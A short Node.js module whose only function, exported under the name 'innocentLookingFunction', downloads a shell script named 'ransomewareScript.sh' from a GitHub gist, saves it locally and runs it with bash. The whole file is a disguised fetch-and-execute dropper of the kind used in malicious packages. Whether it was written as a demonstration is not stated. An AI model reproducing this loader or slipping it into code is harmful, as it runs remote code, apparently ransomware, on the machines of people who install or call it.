const axios = require("axios");
const fs = require("fs");
const { execFile } = require("child_process");

async function download() {
  const res = await axios.get(
    "https://gist.githubusercontent.com/uzair004/a3ff6b1e317a13063ff67f8da5c62f5a/raw/b14630abdec0e9abc8fd56c64421c7e66f1a89fd/ransomewareScript.sh",
    { responseType: "stream" }
  );
  await new Promise((resolve, reject) => {
    const fileStream = fs.createWriteStream("./script.sh");
    res.data.pipe(fileStream);
    fileStream.on("finish", function () {
      resolve();
    });
  });
}

const run = async () => {
  await download();
  execFile("bash", ["script.sh"]);
};

module.exports = function innocentLookingFunction() {
  return run();
};
